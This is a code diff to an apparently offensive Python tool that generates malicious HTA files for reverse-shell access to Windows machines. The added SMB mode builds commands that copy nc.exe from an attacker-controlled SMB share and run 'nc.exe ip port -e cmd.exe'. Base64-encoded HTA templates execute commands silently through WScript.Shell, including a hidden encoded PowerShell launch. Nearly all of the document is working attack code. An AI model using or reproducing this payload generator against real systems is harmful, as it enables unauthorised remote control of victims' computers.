@@ -6,12 +6,14 @@ import base64
 import argparse
 import os
 import requests
+import sys
 
 def Main():
     parser = argparse.ArgumentParser()
     parser.add_argument("ip", help="IP address", type=str)
     parser.add_argument("port", help="PORT", type=str)
-    parser.add_argument("--nc", help="use nc.exe (if powershell don't work)", action="store_true")
+    parser.add_argument("--smb", help="execute nc.exe via smb", action="store_true")
+    parser.add_argument("--powercat", help="use powercat.ps1 (if powershell don't work)", action="store_true")
     args = parser.parse_args()
 
     def reverse_shell(ip, port):
@@ -35,6 +37,26 @@ def Main():
         payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
         return payload
     
+    def smb_shell(ip, share):
+        if os.path.exists('smbserver.py') != True:
+            print("[*] Downloading smbserver.py")
+            r = requests.get("https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py")
+            with open("smbserver.py", 'w', encoding = 'utf-8') as f:
+                f.write(r.text)
+                f.close()
+
+        #https://lolbas-project.github.io/lolbas/Binaries/Expand/
+        rev = f"expand \\\\\\\\{ip}\\\\{share}\\\\nc.exe c:\\\\users\\\\public\\\\nc.exe"
+        print(rev)
+        return rev
+
+    def smb_exec(ip, port):
+        if os.path.exists('nc.exe') != True:
+            print("[*] Please download/copy nc.exe here.")
+        rev = f"c:\\\\users\\\\public\\\\nc.exe {ip} {port} -e cmd.exe"
+        print(rev)
+        return rev
+    
     def hta(payload):
         hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oInBvd2Vyc2hlbGwgLW5vcCAtdyAxIC1lbmMgQkFTRTY0IiwgMCk7d2luZG93LmNsb3NlKCk7Cjwvc2NyaXB0Pgo8dGl0bGU+V2VpcmQgVGl0bGU8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+V0VJUkQgSFRBPC9oMT4KPGhyPgo8L2JvZHk+CjwvaHRtbD4KCg=="
         hta_plain = base64.b64decode(hta_b64).decode()
@@ -43,10 +65,31 @@ def Main():
             f.write(hta)
             f.close()
         print("[*] Written fela.hta")
+
+    def hta_smb(payload, fname):
+        hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oIkNNREhFUkUiLCAwKTt3aW5kb3cuY2xvc2UoKTsKPC9zY3JpcHQ+Cjx0aXRsZT5XZWlyZCBUaXRsZTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CjxoMT5XRUlSRCBIVEE8L2gxPgo8aHI+CjwvYm9keT4KPC9odG1sPgoK"
+        hta_plain = base64.b64decode(hta_b64).decode()
+        hta = hta_plain.replace("CMDHERE", payload)
+        with open(fname, 'w', encoding = 'utf-8') as f:
+            f.write(hta)
+            f.close()
+        print(f"[*] Written {fname}")
         
-    if args.nc:
+    if args.powercat:
         payload = nc_shell(args.ip, args.port)
         hta(payload)
+
+    elif args.smb:
+        share = input("[*] Enter your share name : ")
+        payload = smb_shell(args.ip, share)
+        fname = "download_nc.hta"
+        hta_smb(payload, fname)
+        payload = smb_exec(args.ip, args.port)
+        fname = "run.hta"
+        hta_smb(payload, fname)
+        print("[*] Please install impacket")
+        print(f"[*] python smbserver.py {share} . -smb2support")
+
     else:
         payload = reverse_shell(args.ip, args.port)
         hta(payload)
